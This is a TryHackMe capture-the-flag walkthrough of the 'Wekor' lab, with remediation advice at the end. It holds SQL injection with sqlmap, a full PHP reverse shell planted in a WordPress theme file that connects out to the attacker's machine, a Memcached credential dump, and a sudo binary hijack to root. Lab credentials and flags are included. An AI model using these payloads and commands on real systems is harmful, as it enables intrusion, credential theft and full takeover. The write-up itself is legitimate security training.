# TryHackMe: Wekor — Full Penetration Testing Walkthrough

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![OS](https://img.shields.io/badge/OS-Linux%20(Ubuntu)-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Author](https://img.shields.io/badge/Author-Eee%20(Edidiong%20Unyime%20Etuk)-blue?style=for-the-badge)

---

## About This Walkthrough

This is my personal step-by-step walkthrough of the **Wekor** room on TryHackMe. I document every single command, every browser action, every Burp Suite step, and every mistake I encountered along the way. This is written so that anyone — beginner or intermediate — can follow along and understand exactly what is happening at each step and why.

**Room Link:** https://tryhackme.com/room/wekorra

---

## Attack Summary

| Step | Action | Tool |
|---|---|---|
| 1 | Port & service scan | nmap |
| 2 | Web enumeration via robots.txt | Browser |
| 3 | Virtual host fuzzing | ffuf |
| 4 | SQL injection on coupon field | Burp Suite + sqlmap |
| 5 | WordPress login | Browser |
| 6 | PHP reverse shell via Theme Editor | Browser + netcat |
| 7 | Memcached credential dump | telnet |
| 8 | Lateral movement to user Orka | shell |
| 9 | Sudo binary hijacking to root | shell |

---

## Prerequisites & Setup

### VPN Connection (TryHackMe)

Before starting, connect to the TryHackMe VPN:

```bash
sudo openvpn /path/to/your-thm.ovpn
```

Verify the VPN is connected:

```bash
ip a | grep tun
# You should see tun0 with an IP like 192.168.x.x
```

Verify connectivity to the target machine:

```bash
ping -c 3 <TARGET_IP>
# You should get responses back
```

---

## Phase 1 — Reconnaissance

### Step 1: Nmap Full Port Scan

We begin by scanning all 65535 TCP ports to discover every open service on the target:

```bash
nmap -sC -sV -A -p- <TARGET_IP> -oN nmap_scan.txt
```

**Flags explained:**
- `-sC` — Run default scripts
- `-sV` — Detect service versions
- `-A` — Aggressive scan (OS detection, traceroute)
- `-p-` — Scan all 65535 ports
- `-oN` — Save output to file

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 9 disallowed entries
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot
|_/comingreallysoon /interesting
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**What we found:**
- Port 22 = SSH (OpenSSH 7.2p2)
- Port 80 = HTTP (Apache 2.4.18)
- robots.txt is leaking hidden paths!

> **Note:** The `-p-` flag makes the scan take a few minutes. Be patient.

---

### Step 2: Web Enumeration — Browser

**Open Firefox and visit:**

```
http://<TARGET_IP>/robots.txt
```

You will see:

```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

Visit each of these paths. The most interesting one is:

```
http://<TARGET_IP>/comingreallysoon
```

This page hints at an IT services shop. Navigate to:

```
http://<TARGET_IP>/it-next/
```

This is the e-commerce shop — our SQL injection target.

---

### Step 3: Virtual Host (VHost) Fuzzing

Many web applications host multiple websites on the same IP using virtual hosts. We need to find hidden subdomains.

**First, install seclists if not installed:**

```bash
sudo apt install seclists -y
```

**Get the baseline response size (for filtering false positives):**

```bash
curl -s -H "Host: fake.wekor.thm" http://<TARGET_IP> | wc -c
# Output: 23
```

**Run ffuf to fuzz virtual hosts:**

```bash
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.wekor.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 23
```

**What `-fs 23` does:** Filters out all responses with size 23 (the fake baseline), so only real subdomains appear.

**Output:**

```
site    [Status: 200, Size: 143, Words: 27, Lines: 6, Duration: 194ms]
```

**Found: `site.wekor.thm`**

**Add both domains to /etc/hosts:**

```bash
echo "<TARGET_IP>  wekor.thm site.wekor.thm" | sudo tee -a /etc/hosts
```

**Now visit in browser:**

```
http://site.wekor.thm/wordpress/
```

You will see an active WordPress blog — this is another major attack surface.

---

## Phase 2 — SQL Injection

### Step 4: Setting Up Burp Suite

We need to intercept the HTTP request from the coupon field to feed it into sqlmap.

**Open Burp Suite:**

```bash
burpsuite &
```

**Configure Firefox to use Burp as proxy:**

1. Open Firefox
2. Go to **Settings** (hamburger menu top right)
3. Search "proxy" in the settings search bar
4. Click **Settings** under Network Settings
5. Select **Manual proxy configuration**
6. Set:
   - HTTP Proxy: `127.0.0.1`
   - Port: `8080`
   - Check **"Also use this proxy for HTTPS"**
7. Click **OK**

**In Burp Suite:**
- Go to **Proxy** tab
- Click **Intercept is on** (make sure it's ON)

### Step 5: Intercepting the Coupon Request

**In your browser, navigate to:**

```
http://wekor.thm/it-next/
```

Look for the shop page. Navigate to:

```
http://wekor.thm/it-next/index.php?page=shop
```

Find the **Coupon Code** input field. Type anything (e.g., `test`) and click **Apply Coupon**.

**Burp Suite will intercept the POST request.** You will see something like:

```
POST /it-next/it_cart.php HTTP/1.1
Host: wekor.thm
User-Agent: Mozilla/5.0 ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

coupon_code=test&apply_coupon=Apply+Coupon
```

**Save this request to a file:**

1. In Burp, click the **Raw** tab
2. Select ALL the text (Ctrl+A)
3. Copy it (Ctrl+C)
4. Open a terminal and run:

```bash
nano /home/kali/req.txt
```

5. Paste the request (Ctrl+V)
6. Save: **Ctrl+X → Y → Enter**

**Forward the request in Burp and turn Intercept OFF** so your browser works normally again:
- Click **Forward** in Burp
- Click **Intercept is on** to toggle it OFF

**Now set Firefox back to No proxy:**
- Firefox → Settings → Network Settings → **No proxy** → OK

### Step 6: Running sqlmap

**Enumerate all databases:**

```bash
sqlmap -r /home/kali/req.txt --dbs --batch
```

**Output:**

```
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
```

**Enumerate tables in the wordpress database:**

```bash
sqlmap -r /home/kali/req.txt -D wordpress --tables --batch
```

**Output:**

```
Database: wordpress
[12 tables]
+-----------------------+
| wp_users              |
| wp_posts              |
| wp_options            |
| ... (9 more)          |
+-----------------------+
```

**Dump the wp_users table (and crack hashes):**

```bash
sqlmap -r /home/kali/req.txt -D wordpress -T wp_users --dump --batch
```

When sqlmap asks if you want to crack hashes — say **Y** and use the default dictionary.

**Output:**

```
Database: wordpress
Table: wp_users
[4 entries]
+----+------------+------------------------------------+
| ID | user_login | user_pass (cracked)                |
+----+------------+------------------------------------+
| 1  | admin      | (not cracked)                      |
| 2  | wp_yura    | soccer13                           |
| 3  | wp_jeffrey | (not cracked)                      |
| 4  | wp_eagle   | (not cracked)                      |
+----+------------+------------------------------------+
```

**Credentials obtained: `wp_yura : soccer13`**

---

## Phase 3 — Initial Foothold (RCE via WordPress)

### Step 7: Logging into WordPress

**In Firefox, navigate to:**

```
http://site.wekor.thm/wordpress/wp-login.php
```

**Login with:**
- Username: `wp_yura`
- Password: `soccer13`

If WordPress asks you to confirm the admin email, click **"The email is correct"** to dismiss it.

You are now in the WordPress Admin Dashboard.

### Step 8: Injecting the Reverse Shell via Theme Editor

**In the WordPress dashboard:**

1. Click **Appearance** in the left sidebar
2. Click **Theme Editor**
3. On the RIGHT side panel, look for **"Theme Files"**
4. Scroll down and click **404 Template (404.php)**
5. The 404.php code will appear in the editor

**Select ALL the existing code in the editor and DELETE it** (Ctrl+A then Delete).

**Now paste the following PHP reverse shell** (with YOUR tun0 IP already set):

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '<YOUR_TUN0_IP>';   // ← Change this to your tun0 IP
$port = 4444;              // ← Keep this as 4444
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); }
    if ($pid) { exit(0); }
    if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { printit("$errstr ($errno)"); exit(1); }

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; }
    if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) { print "$string\n"; }
}
?>
```

> **IMPORTANT:** Replace `<YOUR_TUN0_IP>` with your actual tun0 IP. Check it with `ip a | grep tun0`.

6. Click **Update File** at the bottom
7. You should see **"File edited successfully."** in green

### Step 9: Catching the Shell

**Open a new terminal and start your netcat listener:**

```bash
nc -lvnp 4444
```

**In Firefox, navigate to the 404.php file to trigger the shell:**

```
http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

**Your terminal should show:**

```
listening on [any] 4444 ...
connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP]
Linux osboxes 4.15.0-132-generic ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

You now have a shell as `www-data`.

**Upgrade to interactive shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Phase 4 — Lateral Movement

### Step 10: Discovering Internal Services

```bash
ss -tlnp
```

**Output:**

```
State   Local Address:Port
LISTEN  127.0.0.1:11211     ← Memcached!
LISTEN  *:22                ← SSH
LISTEN  127.0.0.1:3306      ← MySQL
LISTEN  :::80               ← HTTP
```

Port `11211` is **Memcached** — an in-memory caching service, often used to cache credentials. It is running with NO authentication.

### Step 11: Dumping Memcached

```bash
telnet 127.0.0.1 11211
```

Once connected, type these commands:

```
get username
```

**Output:**
```
VALUE username 0 4
Orka
END
```

```
get password
```

**Output:**
```
VALUE password 0 15
OrkAiSC00L24/7$
END
```

Exit telnet:
```
quit
```

**Credentials found:** `Orka : OrkAiSC00L24/7$`

### Step 12: Switch to User Orka

First upgrade your shell (required for su):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then switch user:

```bash
su Orka
# Password: OrkAiSC00L24/7$
```

**Get the user flag:**

```bash
cat /home/Orka/user.txt
# 1a26a6d51c0172400add0e297608dec6
```

---

## Phase 5 — Privilege Escalation to Root

### Step 13: Check Sudo Permissions

```bash
sudo -l
# Password: OrkAiSC00L24/7$
```

**Output:**

```
User Orka may run the following commands on osboxes:
    (ALL : ALL) NOPASSWD: /home/Orka/Desktop/bitcoin
```

Orka can run `/home/Orka/Desktop/bitcoin` as root with no password. The key vulnerability here is that **the Desktop directory is owned and writable by Orka** — meaning we can replace the bitcoin binary with anything we want.

### Step 14: Binary Hijacking

```bash
# Step 1: Rename the original Desktop directory
mv /home/Orka/Desktop /home/Orka/Desktop.bak

# Step 2: Create a new Desktop directory
mkdir /home/Orka/Desktop

# Step 3: Copy bash into it as "bitcoin"
cp /bin/bash /home/Orka/Desktop/bitcoin
chmod +x /home/Orka/Desktop/bitcoin
```

### Step 15: Execute as Root & Get Root Flag

```bash
echo 'OrkAiSC00L24/7$' | sudo -S /home/Orka/Desktop/bitcoin -pc 'cat /root/root.txt'
```

**Output:**

```
f4e788f87cc3afaecbaf0f0fe9ae6ad7
```

**ROOTED!** 🎉

---

## Flags

| Flag | Value |
|---|---|
| **User Flag** (`/home/Orka/user.txt`) | `1a26a6d51c0172400add0e297608dec6` |
| **Root Flag** (`/root/root.txt`) | `f4e788f87cc3afaecbaf0f0fe9ae6ad7` |

---

## Lessons Learned

1. **robots.txt should never expose sensitive paths** — always check it during recon
2. **VHost fuzzing is essential** — hidden subdomains often run completely different applications
3. **User input must always be sanitized** — the coupon field had zero input validation
4. **WordPress file editing should be disabled in production** — it gave us full RCE
5. **Never store plaintext credentials in Memcached** — it is unauthenticated by default
6. **Sudo permissions must be carefully scoped** — never allow sudo on binaries in user-writable directories

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port and service enumeration |
| `ffuf` | Virtual host fuzzing |
| `Burp Suite` | HTTP request interception |
| `sqlmap` | Automated SQL injection |
| `netcat` | Reverse shell listener |
| `telnet` | Memcached interaction |
| `python3` | Shell stabilization |

---

## Remediation

| Vulnerability | Severity | Fix |
|---|---|---|
| SQL Injection | 🔴 Critical | Use parameterized queries / prepared statements |
| WordPress File Editing | 🟠 High | Add `define('DISALLOW_FILE_EDIT', true)` to wp-config.php |
| Unauthenticated Memcached | 🟠 High | Enable SASL auth; never cache plaintext credentials |
| Insecure Sudo Binary Path | 🔴 Critical | Move sudo-allowed binaries to root-owned, non-writable paths |

---

## Disclaimer

This walkthrough is for **educational purposes only** and was performed on an authorized TryHackMe lab environment. Never perform these techniques on systems without explicit written permission.

---

*Walkthrough by Edidiong Unyime Etuk (Eee) — Blue Team Cybersecurity Trainee, Start Innovation Hub Uyo*
